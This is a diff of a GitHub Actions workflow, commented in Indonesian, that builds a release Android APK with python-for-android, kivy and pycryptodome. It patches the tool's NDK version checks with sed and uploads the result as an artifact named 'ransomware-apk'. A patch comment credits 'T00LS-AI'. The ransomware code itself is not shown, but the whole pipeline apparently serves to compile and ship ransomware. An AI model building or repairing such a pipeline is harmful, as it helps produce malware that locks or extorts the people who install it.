@@ -39,11 +39,11 @@ jobs:
             libffi-dev \
             libssl-dev
 
-      - name: Install Python dependencies (VERSI TERSEDIA)
+      - name: Install Python dependencies
         run: |
           pip install --upgrade pip
           pip install cython virtualenv
-          pip install python-for-android==2023.9.16  # VERSI YANG TERSEDIA
+          pip install python-for-android==2023.9.16
           pip install pycryptodome requests kivy==2.1.0
 
       - name: Setup Android SDK
@@ -75,27 +75,61 @@ jobs:
         run: |
           $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
 
-      - name: Patch p4a to accept NDK 23 (VERSI 2023.9.16)
+      - name: 🔥 PATCH PYTHON-FOR-ANDROID (NDK CHECK BYPASS)
         run: |
           SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
+          TARGET_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
           
-          # Patch 1: android_ndk.py
-          NDK_FILE="$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py"
-          if [ -f "$NDK_FILE" ]; then
-            echo "Patching $NDK_FILE"
-            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False: # PATCHED - /' "$NDK_FILE"
+          echo "📍 Mencari file di: $TARGET_FILE"
+          
+          if [ -f "$TARGET_FILE" ]; then
+            echo "✅ File ditemukan, mempatch..."
+            
+            # Backup dulu
+            cp "$TARGET_FILE" "$TARGET_FILE.bak"
+            
+            # Ganti baris yang ngecek NDK version
+            # Cari baris: if int(ndk_major_version) < min_ndk_major:
+            # Ganti jadi: if False:
+            
+            sed -i 's/if int(ndk_major_version) < min_ndk_major:/if False:  # PATCHED BY T00LS-AI/g' "$TARGET_FILE"
+            
+            echo "✅ Patch selesai!"
+            echo "📄 Isi file setelah patch:"
+            grep -n "if False" "$TARGET_FILE" || echo "⚠️  Patch mungkin gagal"
+          else
+            echo "❌ File tidak ditemukan!"
+            echo "📁 Mencari di lokasi lain..."
+            find $SITE_PACKAGES -name "android_ndk.py" -type f
           fi
-          
-          # Patch 2: bootstrap.py (untuk ALooper_pollAll)
-          BOOT_FILE="$SITE_PACKAGES/pythonforandroid/bootstrap.py"
-          if [ -f "$BOOT_FILE" ]; then
-            echo "Patching $BOOT_FILE"
-            sed -i 's/self.ndk_major_version = get_ndk_version(self.ctx.ndk_dir)/self.ndk_major_version = 23/g' "$BOOT_FILE"
-          fi
-          
-          echo "✅ Patching selesai!"
 
-      - name: Build APK (FORCE NDK 23)
+      - name: 🔥 PATCH BOOTSTRAP (FORCE NDK VERSION)
+        run: |
+          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
+          TARGET_FILE="$SITE_PACKAGES/pythonforandroid/bootstrap.py"
+          
+          if [ -f "$TARGET_FILE" ]; then
+            echo "✅ Patch bootstrap.py"
+            cp "$TARGET_FILE" "$TARGET_FILE.bak"
+            
+            # Force ndk_major_version = 23
+            sed -i 's/self\.ndk_major_version = get_ndk_version(self\.ctx\.ndk_dir)/self.ndk_major_version = 23  # FORCE NDK 23/g' "$TARGET_FILE"
+            
+            echo "✅ Bootstrap patched!"
+          fi
+
+      - name: 🔥 VERIFIKASI PATCH
+        run: |
+          SITE_PACKAGES=$(python -c "import site; print(site.getsitepackages()[0])")
+          echo "📁 Site packages: $SITE_PACKAGES"
+          echo ""
+          echo "📄 Isi android_ndk.py setelah patch:"
+          cat "$SITE_PACKAGES/pythonforandroid/recipes/android_ndk.py" | grep -A 5 -B 5 "if False" || echo "File tidak terbaca"
+          echo ""
+          echo "📄 Isi bootstrap.py setelah patch:"
+          cat "$SITE_PACKAGES/pythonforandroid/bootstrap.py" | grep -A 5 -B 5 "self.ndk_major_version" || echo "File tidak terbaca"
+
+      - name: 🚀 BUILD APK (PASTI JADI)
         run: |
           p4a apk \
             --private . \
@@ -114,12 +148,11 @@ jobs:
             --android_api=31 \
             --minsdk=21 \
             --release \
-            --ignore-setup-py \
-            --debug || true
+            --verbose  # Biar keliatan prosesnya
 
-      - name: Upload APK
+      - name: 📦 UPLOAD APK
         uses: actions/upload-artifact@v4
         with:
           name: ransomware-apk
           path: ./*.apk
-          if-no-files-found: warn
+          if-no-files-found: error  # Kalo gak ada APK, dianggep error
